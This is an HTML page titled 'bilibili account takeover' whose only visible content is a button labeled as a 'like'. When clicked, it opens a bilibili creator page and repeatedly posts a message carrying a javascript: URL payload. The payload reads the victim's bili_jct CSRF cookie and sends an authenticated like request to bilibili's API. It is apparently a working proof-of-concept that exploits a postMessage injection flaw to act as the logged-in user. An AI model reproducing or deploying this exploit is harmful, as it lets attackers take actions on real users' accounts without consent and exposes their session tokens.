<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>bilibili account takeover</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        
        button {
            background: linear-gradient(135deg, #00B5E2 0%, #0084FF 100%);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 8px 15px rgba(0, 132, 255, 0.3);
            transition: all 0.3s ease;
            letter-spacing: 1px;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 20px rgba(0, 132, 255, 0.4);
            background: linear-gradient(135deg, #0099CC 0%, #006FDD 100%);
        }
        
        button:active {
            transform: translateY(-1px);
            box-shadow: 0 5px 10px rgba(0, 132, 255, 0.3);
        }
    </style>
</head>
<body>
    <button id="openAndSend">👍 点赞</button>

    <script>
        document.getElementById('openAndSend').addEventListener('click', function() {
            // 打开新窗口
            const newWindow = window.open('https://member.bilibili.com/platform/upload/playlet', '_blank');
            
            if (newWindow) {
                let messageSent = false;
                let attemptCount = 0;
                
                // 使用 setInterval 持续发送消息
                const interval = setInterval(() => {
                    try {
                        attemptCount++;
                        
                        const likeCode = `javascript:(function(){function getCookie(name){const value='; '+document.cookie;const parts=value.split('; '+name+'=');if(parts.length===2)return parts.pop().split(';').shift();}const csrf=getCookie('bili_jct');const params=new URLSearchParams({aid:'115926200485930',like:'1',from_spmid:'333.1007.tianma.1-1-1.click',spmid:'333.788.0.0',statistics:JSON.stringify({"appId":100,"platform":5}),eab_x:'2',ramval:'6',source:'web_normal',ga:'1',csrf:csrf});fetch('https://api.bilibili.com/x/web-interface/archive/like',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:params.toString(),credentials:'include'}).then(res=>res.json()).then(data=>{console.log('点赞响应:',data);}).catch(err=>{console.error('点赞失败:',err);});})();`;
                        
                        newWindow.postMessage({
                            "key": "goURL",
                            "value": likeCode
                        }, '*');
                        
                        console.log(`尝试发送消息 #${attemptCount}:`, {
                            "key": "goURL",
                            "value": likeCode
                        });
                        
                        // 检查窗口是否关闭
                        if (newWindow.closed) {
                            console.log('目标窗口已关闭，停止发送消息');
                            clearInterval(interval);
                            return;
                        }
                        
                    } catch (error) {
                        console.error('发送消息时出错:', error);
                        clearInterval(interval);
                    }
                }, 1000); // 每秒发送一次
                
                // 监听来自新窗口的确认消息
                window.addEventListener('message', function(event) {
                    if (event.source === newWindow && event.data && event.data.status === 'received') {
                        console.log('收到确认消息，停止发送');
                        messageSent = true;
                        clearInterval(interval);
                    }
                });
                
            } else {
                alert('无法打开新窗口，请检查浏览器的弹窗拦截设置。');
            }
        });
    </script>
</body>
</html>
